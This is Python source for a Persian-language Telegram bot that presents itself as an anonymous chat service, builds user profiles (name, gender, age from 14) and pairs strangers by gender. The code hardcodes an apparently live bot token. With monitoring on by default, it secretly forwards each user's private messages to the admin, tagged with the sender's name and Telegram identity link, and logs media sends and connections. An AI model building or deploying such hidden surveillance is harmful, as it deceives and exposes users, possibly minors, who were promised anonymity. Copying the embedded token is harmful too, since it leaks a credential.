import logging
import json
import threading
import os
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)

# --- تنظیمات اصلی ربات ---
TOKEN = "7689216297:AAHVucWhXpGlp15Ulk2zsppst1gDH9PCZnQ"
ADMIN_ID = 6929024145

# --- بخش وب سرور برای بیدار نگه داشتن ربات ---
app = Flask(__name__)
@app.route('/')
def index():
    return "Bot is alive!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- لاگ‌گیری و دیباگ ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- متغیرهای وضعیت ---
user_partners = {}
waiting_pool = {"random": [], "male": [], "female": []} # صف‌های انتظار تفکیک شده
monitoring_enabled = True

# --- مراحل مکالمه برای ساخت پروفایل ---
NAME, GENDER, AGE = range(3)

# --- مدیریت فایل دیتابیس (JSON) ---
def load_user_data():
    try:
        with open("users.json", "r", encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_user_data(data):
    with open("users.json", "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

user_data = load_user_data()

# --- کیبوردهای ربات ---
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🔍 جستجوی شانسی", callback_data="search_random")],
        [
            InlineKeyboardButton("🧑‍💻 جستجوی پسر", callback_data="search_male"),
            InlineKeyboardButton("👩‍💻 جستجوی دختر", callback_data="search_female"),
        ],
        [InlineKeyboardButton("👤 پروفایل من", callback_data="my_profile")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_in_chat_keyboard():
    keyboard = [["❌ قطع و بعدی"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# --- توابع اصلی ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    await update.message.reply_text(
        "به ربات چت ناشناس خوش اومدی! 🔥\n\nاز منوی زیر یکی از گزینه‌ها رو انتخاب کن:",
        reply_markup=get_main_menu(),
    )
    if user_id not in user_data:
        await update.message.reply_text(
            "اول باید پروفایلت رو بسازی! لطفاً روی /profile کلیک کن یا دستورش رو تایپ کن."
        )

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if str(user_id) not in user_data:
        await query.edit_message_text("❌ اول باید با دستور /profile پروفایلت رو بسازی!")
        return

    if query.data == "my_profile":
        await my_profile(update, context)
        return
    
    # تفکیک نوع جستجو
    search_type = "random"
    target_gender = None
    if query.data == "search_male":
        search_type = "male"
        target_gender = "پسر"
    elif query.data == "search_female":
        search_type = "female"
        target_gender = "دختر"

    await search_partner(update, context, search_type, target_gender)


async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "۱. اسمت چیه؟ (این اسم به طرف مقابل نمایش داده میشه)",
        reply_markup=ReplyKeyboardRemove(),
    )
    return NAME

# ... توابع received_name, received_gender, received_age از کد قبلی بدون تغییر اینجا قرار می‌گیرند ...
async def received_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['name'] = update.message.text
    reply_keyboard = [["پسر", "دختر"]]
    await update.message.reply_text(
        "۲. جنسیتت چیه؟",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True),
    )
    return GENDER

async def received_gender(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['gender'] = update.message.text
    await update.message.reply_text("۳. چند سالته؟ (فقط عدد وارد کن)")
    return AGE

async def received_age(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = str(update.message.from_user.id)
    try:
        age = int(update.message.text)
        if not 13 < age < 80:
            await update.message.reply_text("لطفاً یک سن معقول وارد کن. دوباره تلا کن.")
            return AGE
        user_data[user_id] = {
            "name": context.user_data['name'],
            "gender": context.user_data['gender'],
            "age": age,
        }
        save_user_data(user_data)
        await update.message.reply_text(
            "✅ پروفایل شما با موفقیت ذخیره شد!",
            reply_markup=ReplyKeyboardRemove()
        )
        await update.message.reply_text("حالا از منوی زیر برای شروع چت استفاده کن:", reply_markup=get_main_menu())
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("لطفاً سن را به صورت عدد وارد کن. دوباره تلاش کن.")
        return AGE
# ... پایان توابع پروفایل ...

async def my_profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.callback_query.from_user.id) if update.callback_query else str(update.message.from_user.id)
    if user_id in user_data:
        profile_info = user_data[user_id]
        text = (
            f"👤 پروفایل شما:\n\n"
            f"🔹 نام: {profile_info['name']}\n"
            f"🔹 جنسیت: {profile_info['gender']}\n"
            f"🔹 سن: {profile_info['age']}\n\n"
            "برای ویرایش از دستور /profile استفاده کن."
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(text)
        else:
            await update.message.reply_text(text)
    else:
        if update.callback_query:
            await update.callback_query.edit_message_text("شما هنوز پروفایلی نساخته‌اید! لطفاً از /profile استفاده کنید.")
        else:
            await update.message.reply_text("شما هنوز پروفایلی نساخته‌اید! لطفاً از /profile استفاده کنید.")


async def search_partner(update: Update, context: ContextTypes.DEFAULT_TYPE, search_type: str, target_gender: str = None):
    query = update.callback_query
    user_id = query.from_user.id

    if user_id in user_partners:
        await query.message.reply_text("شما در حال حاضر در یک چت هستید!")
        return
    
    for queue in waiting_pool.values():
        if user_id in queue:
            await query.message.reply_text("شما از قبل در صف انتظار هستید!")
            return

    await query.edit_message_text("⏳ در حال جستجو برای یک هم‌صحبت... لطفاً صبر کن.\nبرای لغو از /cancel استفاده کن.")
    
    # پیدا کردن شریک مناسب
    partner_id = None
    if search_type == "random":
        # اولویت با صف‌های جنسیتی مخالف
        my_gender = user_data[str(user_id)]['gender']
        opposite_gender_queue = waiting_pool['female'] if my_gender == 'پسر' else waiting_pool['male']
        if opposite_gender_queue:
            partner_id = opposite_gender_queue.pop(0)
        elif waiting_pool['random']: # اگر کسی در صف مخالف نبود، از صف شانسی بردار
            partner_id = waiting_pool['random'].pop(0)
    else: # جستجوی جنسیتی
        if waiting_pool[search_type]:
            partner_id = waiting_pool[search_type].pop(0)

    if partner_id:
        # اتصال دو کاربر
        user_partners[user_id] = partner_id
        user_partners[partner_id] = user_id
        
        profile1 = user_data[str(user_id)]
        profile2 = user_data[str(partner_id)]
        
        await context.bot.send_message(user_id, f"✅ یک هم‌صحبت پیدا شد!\n\n"
                                                 f"👤 پروفایل طرف مقابل: {profile2['name']}، {profile2['gender']}، {profile2['age']} ساله",
                                                 reply_markup=get_in_chat_keyboard())
        await context.bot.send_message(partner_id, f"✅ یک هم‌صحبت پیدا شد!\n\n"
                                                 f"👤 پروفایل طرف مقابل: {profile1['name']}، {profile1['gender']}، {profile1['age']} ساله",
                                                 reply_markup=get_in_chat_keyboard())
        await context.bot.send_message(ADMIN_ID, f"🔗 اتصال جدید: {user_id} به {partner_id}")
    else:
        # اضافه کردن به صف انتظار مناسب
        if target_gender:
            my_gender = user_data[str(user_id)]['gender']
            if my_gender == "پسر":
                waiting_pool['male'].append(user_id)
            else:
                waiting_pool['female'].append(user_id)
        else:
            waiting_pool['random'].append(user_id)


async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    if user_id in user_partners:
        partner_id = user_partners[user_id]
        
        # ارسال کپی پیام به مدیر
        if monitoring_enabled:
            sender_profile = user_data.get(str(user_id), {"name": "ناشناس"})
            await context.bot.send_message(ADMIN_ID, f"🖼️ مدیا از [{sender_profile['name']}](tg://user?id={user_id})", parse_mode='Markdown')

        # فوروارد کردن انواع مدیا
        if update.message.photo:
            await context.bot.send_photo(partner_id, update.message.photo[-1].file_id, caption=update.message.caption)
        elif update.message.voice:
            await context.bot.send_voice(partner_id, update.message.voice.file_id, caption=update.message.caption)
        elif update.message.sticker:
            await context.bot.send_sticker(partner_id, update.message.sticker.file_id)
        elif update.message.video:
            await context.bot.send_video(partner_id, update.message.video.file_id, caption=update.message.caption)
        elif update.message.document:
            await context.bot.send_document(partner_id, update.message.document.file_id, caption=update.message.caption)

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    text = update.message.text

    # دکمه قطع چت
    if text == "❌ قطع و بعدی":
        await next_chat(update, context)
        return

    if user_id in user_partners:
        partner_id = user_partners[user_id]
        await context.bot.send_message(partner_id, text)
        if monitoring_enabled:
            sender_profile = user_data.get(str(user_id), {"name": "ناشناس"})
            await context.bot.send_message(ADMIN_ID, f"💬 پیام از [{sender_profile['name']}](tg://user?id={user_id}):\n`{text}`", parse_mode='Markdown')
    else:
        await update.message.reply_text("شما به کسی وصل نیستی. از منوی زیر استفاده کن:", reply_markup=get_main_menu())


async def next_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    if user_id in user_partners:
        partner_id = user_partners.pop(user_id)
        if partner_id in user_partners:
            user_partners.pop(partner_id)
        
        await context.bot.send_message(partner_id, "❌ طرف مقابل چت را ترک کرد.", reply_markup=ReplyKeyboardRemove())
        await context.bot.send_message(partner_id, "از منوی زیر برای شروع یک چت جدید استفاده کن:", reply_markup=get_main_menu())
        
        await update.message.reply_text("شما چت را ترک کردید.", reply_markup=ReplyKeyboardRemove())
        await update.message.reply_text("از منوی زیر برای شروع یک چت جدید استفاده کن:", reply_markup=get_main_menu())

        await context.bot.send_message(ADMIN_ID, f"🔌 اتصال قطع شد: {user_id} و {partner_id}")
    else:
        await update.message.reply_text("شما در حال حاضر در چت نیستی.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    # حذف کاربر از تمام صف‌های انتظار
    for queue in waiting_pool.values():
        if user_id in queue:
            queue.remove(user_id)
    
    await update.message.reply_text(
        "عملیات لغو شد.",
        reply_markup=get_main_menu()
    )
    # اگر در فرآیند ساخت پروفایل بود، آن را هم لغو می‌کند
    if 'conv_handler_active' in context.user_data:
        del context.user_data['conv_handler_active']
        return ConversationHandler.END
    return ConversationHandler.END

# ... توابع مدیر (admin_stats, admin_monitor_toggle) بدون تغییر اینجا قرار می‌گیرند ...
async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.from_user.id != ADMIN_ID: return
    total_users = len(user_data)
    active_chats = len(user_partners) // 2
    waiting_random = len(waiting_pool['random'])
    waiting_male = len(waiting_pool['male'])
    waiting_female = len(waiting_pool['female'])
    await update.message.reply_text(
        f"📊 آمار ربات:\n"
        f"👤 کل کاربران: {total_users}\n"
        f"💬 چت‌های فعال: {active_chats}\n"
        f"⏳ در صف انتظار (شانسی): {waiting_random}\n"
        f"👨 در صف انتظار (پسر): {waiting_male}\n"
        f"👩 در صف انتظار (دختر): {waiting_female}"
    )

async def admin_monitor_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.from_user.id != ADMIN_ID: return
    global monitoring_enabled
    monitoring_enabled = not monitoring_enabled
    status = "فعال" if monitoring_enabled else "غیرفعال"
    await update.message.reply_text(f"👁️ حالت مشاهده چت‌ها اکنون {status} است.")
# ... پایان توابع مدیر ...

def main() -> None:
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("profile", profile)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_name)],
            GENDER: [MessageHandler(filters.Regex("^(پسر|دختر)$"), received_gender)],
            AGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, received_age)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(handle_callback_query))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("next", next_chat))
    
    # مدیریت مدیا
    application.add_handler(MessageHandler(filters.PHOTO | filters.VOICE | filters.STICKER | filters.VIDEO | filters.DOCUMENT, handle_media))
    # مدیریت پیام متنی
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("monitor", admin_monitor_toggle))
    
    logger.info("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
